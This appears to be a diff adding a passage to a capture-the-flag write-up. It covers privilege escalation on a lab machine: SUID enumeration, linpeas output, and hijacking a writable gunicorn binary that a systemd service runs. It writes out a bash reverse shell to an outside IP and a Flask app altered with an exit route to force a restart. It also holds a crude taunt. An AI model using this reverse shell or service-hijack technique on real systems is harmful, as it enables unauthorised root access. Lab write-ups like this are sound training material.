@@ -711,3 +711,210 @@ drwxr-xr-x 23 root    root    4096 Apr  7  2024 ..
 drwxr-xr-x 11 beth    beth    4096 May  7  2024 beth
 drw-------  3 charles charles 4096 Apr 23  2024 charles
 ```
+
+wait for me charles I'm gonna fuck you too.
+
+
+```bash
+beth@london:/home$ find / -perm /4000 2>/dev/null
+/bin/fusermount
+/bin/su
+/bin/ping
+/bin/mount
+/bin/umount
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/traceroute6.iputils
+/usr/bin/newuidmap
+/usr/bin/sudo
+/usr/bin/newgidmap
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/share/dbus-1/system-services
+```
+nothing crazy
+
+
+Lets run linpeas.
+
+```
+/etc/systemd/system/multi-user.target.wants/app.service is calling this writable executable: /home/beth/
+```
+
+```bash
+beth@london:/tmp$ cat /etc/systemd/system/multi-user.target.wants/app.service
+[Unit]
+Description=My service
+After=multi-user.target
+
+[Service]
+Type=simple
+Restart=always
+WorkingDirectory=/home/beth
+Environment="PATH=/home/beth"
+ExecStart=/home/beth/.local/bin/gunicorn --config gunicorn_config.py app:app
+
+[Install]
+WantedBy=multi-user.target
+```
+
+
+So we can make gunicorn a reverse shell. And get the root.
+
+
+```bash
+beth@london:~$ cd .local/bin/
+beth@london:~/.local/bin$ ls
+flask  gunicorn  gunicorn_paster
+beth@london:~/.local/bin$ mv gunicorn gunicorn.bak
+beth@london:~/.local/bin$ ls
+flask  gunicorn.bak  gunicorn_paster
+beth@london:~/.local/bin$ ls -la
+total 20
+drwxrwxr-x 2 beth beth 4096 Jul  9 05:34 .
+drwxrwxr-x 5 beth beth 4096 Mar 11  2024 ..
+-rwxrwxr-x 1 beth beth  212 Mar 11  2024 flask
+-rwxrwxr-x 1 beth beth  221 Mar 11  2024 gunicorn.bak
+-rwxrwxr-x 1 beth beth  222 Mar 11  2024 gunicorn_paster
+beth@london:~/.local/bin$ vim
+
+Command 'vim' not found, but can be installed with:
+
+apt install vim       
+apt install vim-gtk3  
+apt install vim-tiny  
+apt install neovim    
+apt install vim-athena
+apt install vim-gtk   
+apt install vim-nox   
+
+Ask your administrator to install one of them.
+
+beth@london:~/.local/bin$ echo "/bin/bash -i >& /dev/tcp/10.21.206.128/4444 0>&1" > gunicorn
+beth@london:~/.local/bin$ chmod 777 gunicorn
+```
+
+
+For this service to restart lets rewrite the source code so we can end the app and systemd will restart that again for us.
+
+Here is the new source code.
+
+
+
+```python
+from flask import Flask, render_template, request, send_from_directory, redirect, url_for, abort
+import sys
+import os
+from PIL import Image
+import requests
+from werkzeug.utils import secure_filename
+import base64
+def is_local(url):
+    # Check if the URL is localhost or 127.0.0.1
+    if 'localhost' in url or '127.0.0.1' in url or '0.0.0.0' in url:
+        return True
+    return False
+
+app = Flask(__name__)
+UPLOAD_FOLDER = 'uploads'
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+
+def is_image(file_path):
+    try:
+        with Image.open(file_path) as img:
+            img.verify()
+        return True
+    except:
+        return False
+
+@app.route('/')
+def home():
+    return render_template('london.html')
+
+@app.route('/gallery')
+def gallery():
+    filenames = os.listdir(app.config['UPLOAD_FOLDER'])
+    return render_template('index.html', filenames=filenames)
+def home():
+    url = request.form.get('www', '')
+    
+    # Check if the requested URL is localhost or 127.0.0.1
+    if is_local(url):
+        abort(403)  # Return a forbidden error if the URL contains localhost or 127.0.0.1
+    
+    if url:
+        return requests.get(url).text
+    return "We are currently trying to take pictures as a URL too"
+
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    if 'file' not in request.files:
+        return "No file part"
+    file = request.files['file']
+    if file.filename == '':
+        return "No selected file"
+    if file:
+        filename = secure_filename(file.filename)
+        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        file.save(file_path)
+        if is_image(file_path):
+            return redirect(url_for('gallery'))
+        else:
+            os.remove(file_path)  # Remove the non-image file
+            return "Uploaded file is not an image"
+    return "Invalid file"
+
+@app.route('/uploads/<filename>')
+def download_file(filename):
+    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
+
+@app.route('/dejaview')
+def view():
+    return render_template('view.html')
+
+# This route will handle the form submission and display the image
+@app.route('/view_image', methods=['POST'])
+def view_image():
+    image_url = request.form.get('image_url', '')
+    url = request.form.get('www', '')
+    if is_local(url):
+        abort(403)  # Return a forbidden error if the URL contains localhost or 127.0.0.1
+    
+    if url:
+        return requests.get(url).text
+    return render_template('view.html', image_url=image_url)
+def url():
+    return "We are currently trying to take pictures as a URL too"
+@app.route('/byebye')
+def byebye():
+   sys.exit("bye bye")
+@app.route('/contact')
+def contact():
+    return render_template('contact.html')
+
+@app.route('/feedback', methods=['POST'])
+def feedback():
+    name = request.form.get('name')
+    email = request.form.get('email')
+    message = request.form.get('message')
+
+    # Do something with the feedback data, such as saving it to a database or sending it via email
+    # For demonstration purposes, we'll simply print the feedback
+    print(f"Received feedback from {name} ({email}): {message}")
+
+    return render_template('feedback_response.html', name=name)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',port=8080)
+```
+
+
+
+
+Now lets curl /bye
